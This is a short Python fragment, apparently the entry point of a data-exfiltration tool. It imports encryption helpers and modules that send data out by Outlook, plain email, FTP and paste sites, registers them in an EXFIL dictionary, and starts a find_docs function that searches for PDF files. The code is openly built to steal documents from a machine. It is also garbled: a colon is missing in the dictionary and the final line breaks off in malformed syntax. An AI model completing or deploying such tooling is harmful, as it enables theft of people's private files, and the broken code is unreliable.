from cryptor import encrypt, decrypt
from email_exfil import outlook, plain_email
from transmit_exfil import plain_ftp, transmit
from paste_exfil import ie_paste, plain_paste

import os

EXFIL = {
    'outlook': outlook,
    'plain_email': plain_email,
    'plain_ftp': plain_ftp,
    'transmit' transmit,
    'ie_paste': ie_paste,
    'plain_paste': plain_paste,
}

def find_docs(doc_type='.pdf'):
    for parent, _,,,,